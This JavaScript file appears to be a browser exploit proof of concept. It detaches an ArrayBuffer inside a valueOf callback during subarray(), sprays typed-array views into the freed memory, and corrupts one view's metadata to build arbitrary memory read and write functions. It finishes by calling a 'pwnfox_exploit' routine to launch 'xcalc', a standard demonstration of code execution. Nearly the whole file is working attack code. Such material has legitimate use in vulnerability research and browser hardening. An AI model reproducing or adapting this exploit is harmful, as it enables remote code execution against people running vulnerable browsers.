var worker = new Worker("some_worker.js");

function fill_arr(a, magic) {
  for (var i = 0;i<a.length;i++) {
    a[i] = magic;
  }
}

const SIZE = 0x100000;

var buffer1 = new ArrayBuffer(SIZE);
var buffer2 = new ArrayBuffer(SIZE);
var magic_offset = 2345;
var magic_length = SIZE - magic_offset;
var arr1 = new Uint32Array(buffer1);
var views = [];

fill_arr(arr1, 0x42434342);

var hax = {
  valueOf: function () {
    worker.postMessage({data: arr1.buffer}, [arr1.buffer]);
    run_garbage_collector();
    var ALLOCS = 0x100000;
    for (i=0; i<ALLOCS; i++) {
      views[i] = new Uint8Array(buffer2, magic_offset, magic_length);
    }
    return SIZE/4;
  }
};

aa = arr1.subarray(0, hax);

var aa_index = -1;

for (i = 5; i < SIZE/4; i++) {
  if (aa[i] == magic_offset && aa[i+2] == magic_length) {
    aa_index = i;
    aa[i] = magic_offset + 1;
    aa[i+2] = magic_length - 1;
    break;
  }
}

if (aa_index == -1) {
  alert("Could not find 1");
}

var view_index = -1;
for (i = 0;i<views.length;i++) {
  if (views[i].byteOffset == (magic_offset + 1)) {
    view_index = i;
    break;
  }
}

if (view_index == -1) {
  alert("Could not find 2");
}

function a_read(addr) {
  aa[aa_index+14] = addr.lower();
  aa[aa_index+15] = addr.upper();
  var val_view = views[view_index];
  var value = [];
  for (var i = 0;i<4;i++) {
    value[i] = val_view[i];
  }
  return value;
}

function a_write(addr, value) {
  aa[aa_index+14] = addr.lower();
  aa[aa_index+15] = addr.upper();
  var val_view = views[view_index];
  for (var i = 0;i<4;i++) {
    val_view[i] = value[i];
  }
}

elf_addr = new Int64(0x400018, 0);
pwnfox_exploit(a_read, a_write, elf_addr, "xcalc");
